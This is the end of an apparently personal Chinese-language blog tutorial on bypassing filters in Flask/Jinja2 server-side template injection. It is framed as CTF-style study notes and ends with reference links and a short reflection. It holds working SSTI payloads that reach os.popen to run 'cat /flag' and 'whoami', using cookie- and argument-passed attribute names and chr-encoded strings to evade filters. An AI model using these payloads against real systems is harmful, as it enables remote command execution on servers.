+<h5 id="绕过引号和下划线"><a href="#绕过引号和下划线" class="headerlink" title="绕过引号和下划线"></a><strong>绕过引号和下划线</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用|attr()绕点过滤</span></span><br><span class="line"><span class="comment">#利用request.args.x/request.cookies.x绕&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).<span class="built_in">eval</span>(request.cookies.x5)&#125;&#125;</span><br><span class="line">cookie传值</span><br><span class="line">Cookie:x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"> X-Forwarded-For:&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(<span class="number">174</span>)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)&#125;&#125;</span><br><span class="line">  </span><br><span class="line">x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__</span><br><span class="line">&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=<span class="built_in">eval</span>&amp;x9=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&#x27;cat+/flag&#x27;</span>).read() </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="绕过引号-中括号"><a href="#绕过引号-中括号" class="headerlink" title="绕过引号 中括号"></a><strong>绕过引号 中括号</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chr &#123;% if ... %&#125;1&#123;% endif %&#125;</span></span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">250</span>).__init__.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> ().__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="built_in">chr</span>(<span class="number">95</span>)%2bchr(<span class="number">119</span>)%2bchr(<span class="number">114</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">112</span>)%2bchr(<span class="number">95</span>)%2bchr(<span class="number">99</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">111</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">101</span>) %&#125;&#123;&#123; c.__init__.__globals__.popen(<span class="built_in">chr</span>(<span class="number">119</span>)%2bchr(<span class="number">104</span>)%2bchr(<span class="number">111</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">109</span>)%2bchr(<span class="number">105</span>)).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p>yu师傅：<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7746">https://xz.aliyun.com/t/7746</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zaqzzz/p/10263396.html">https://www.cnblogs.com/zaqzzz/p/10263396.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33942040/article/details/109164895">https://blog.csdn.net/qq_33942040/article/details/109164895</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43936524/article/details/116306294">https://blog.csdn.net/qq_43936524/article/details/116306294</a></p>
+<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>​      关于ssti注入的绕过从一开始的套用模板payload，到现在逐步去了解原理，payload的构成，能够对ssti有了一点浅显的认知，但是由于语句是多样的，我并没有对次进行深入的学习，只简单地在eval执行命令这一些语句上进行绕过和过滤的学习，对自己的了解做一个简单的总结。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EFlask%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">关于Flask的前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flask%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.1.</span> <span class="toc-text">flask是什么</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flask%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">Flask请求参数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#url%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">url传递参数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#request%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text">request全局变量</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask%E6%A8%A1%E5%9D%97%E5%93%8D%E5%BA%94"><span class="toc-number">2.</span> <span class="toc-text">Flask模块响应</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">相关函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8render-template%E6%B8%B2%E6%9F%93%E6%A8%A1%E6%9D%BF%E5%B9%B6%E8%BF%94%E5%9B%9E%E7%BB%99%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-number">2.2.</span> <span class="toc-text">使用render_template渲染模板并返回给浏览器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B7%E6%9C%89%E6%8F%90%E4%BA%A4%E5%8F%82%E6%95%B0%E7%9A%84%E6%A8%A1%E5%9D%97%E5%93%8D%E5%BA%94"><span class="toc-number">2.3.</span> <span class="toc-text">具有提交参数的模块响应</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8render-template-string%E6%B8%B2%E6%9F%93%E6%A8%A1%E6%9D%BF%EF%BC%88ssti%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%EF%BC%89"><span class="toc-number">2.4.</span> <span class="toc-text">使用render_template_string渲染模板（ssti注入的原理）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">ssti模板注入的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">ssti模板注入原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jinja2%E8%AF%AD%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">jinja2语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python%E4%B8%AD%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%B1%BB%EF%BC%88%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%EF%BC%89"><span class="toc-number">3.3.</span> <span class="toc-text">python中的基本类（沙盒逃逸的魔术方法）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%A3%80%E6%B5%8B"><span class="toc-number">3.4.</span> <span class="toc-text">工具检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%BA%9Bpayload"><span class="toc-number">3.5.</span> <span class="toc-text">一些payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87payload"><span class="toc-number">3.6.</span> <span class="toc-text">绕过payload</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%96%B9%E6%8B%AC%E5%8F%B7"><span class="toc-number">3.6.1.</span> <span class="toc-text">过滤方括号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7%EF%BC%88%E5%8D%95%E5%BC%95%E5%8F%B7-%E5%8F%8C%E5%BC%95%E5%8F%B7%EF%BC%89"><span class="toc-number">3.6.2.</span> <span class="toc-text">过滤引号（单引号 双引号）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%8F%8C%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-number">3.6.3.</span> <span class="toc-text">过滤双下划线</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%8F%8C%E8%8A%B1%E6%8B%AC%E5%8F%B7"><span class="toc-number">3.6.4.</span> <span class="toc-text">绕过双花括号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%82%B9%EF%BC%88%E8%BF%87%E6%BB%A4%E5%99%A8%EF%BC%89"><span class="toc-number">3.6.5.</span> <span class="toc-text">绕过点（过滤器）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%BC%95%E5%8F%B7%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-number">3.6.6.</span> <span class="toc-text">绕过引号和下划线</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%BC%95%E5%8F%B7-%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span class="toc-number">3.6.7.</span> <span class="toc-text">绕过引号 中括号</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.7.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="toc-number">4.</span> <span class="toc-text">写在最后</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
